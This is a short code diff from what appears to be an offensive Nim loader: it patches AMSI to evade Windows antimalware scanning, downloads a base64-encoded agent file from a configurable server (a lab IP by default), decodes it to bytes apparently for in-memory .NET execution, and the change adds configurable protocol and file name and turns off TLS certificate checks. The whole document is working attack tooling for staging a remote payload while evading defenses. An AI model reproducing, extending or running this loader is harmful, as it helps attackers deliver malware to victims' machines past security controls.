@@ -2,13 +2,16 @@ import httpclient
 import std/base64
 import winim/clr
 import strformat
+import std/net
 
 import winim/lean
 import dynlib
 import strenc
 
 const ServerPort {.intdefine.}: int = 80
+const ServerProtocol {.strdefine.}: string = "http"
 const ServerAddress {.strdefine.}: string = "192.168.56.102"
+const FileName {.strdefine.}: string = "Agent.b64"
 const DotNetParams {.strdefine.}: string = "https:192.168.56.102:443"
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
@@ -52,9 +55,9 @@ proc PatchAmsi(): bool =
 
 
 
-var url = "http://" & ServerAddress & ":" & $ServerPort & "/"  &  "Agent.b64"
+var url = ServerProtocol & "://" & ServerAddress & ":" & $ServerPort & "/"  &  FileName
 echo "Downloading " & url
-var httpClt = newHttpClient()
+var httpClt = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
 var content = httpClt.getContent(url)
 let decoded = decode(content)
 var bytes = toByteSeq(decoded)
